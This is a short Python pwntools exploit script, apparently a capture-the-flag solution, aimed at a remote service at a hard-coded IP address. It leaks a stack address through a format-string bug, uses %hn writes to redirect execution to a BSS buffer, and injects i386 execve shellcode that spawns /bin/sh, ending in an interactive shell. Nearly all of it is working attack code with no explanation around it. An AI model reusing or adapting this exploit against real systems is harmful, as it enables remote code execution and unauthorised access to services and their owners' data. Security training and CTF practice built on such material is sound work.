from pwn import *

context.log_level = 'info'
r = remote('52.6.64.173',4545)
#r = remote('localhost',8888)

##buffer is in bss not on stack can't wrap around to it

bufaddr = 0x804a080
OFFSET = 4 ##Offset to the argument containing buffers

shellcode ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

r.send('%4$p\n') ##Leak an addr

addr = int(r.recv(0xa),16)+(OFFSET)
log.info('stack: %x'%addr)
addr = addr&0xFFFF ##Get lower 4 bytes

r.send('%.'+str(addr)+'u%4$hn\n') ##write those bytes
lower = bufaddr&0xffff
r.send(shellcode+'%.'+str(lower-len(shellcode))+'u%12$hn\n')

r.interactive()
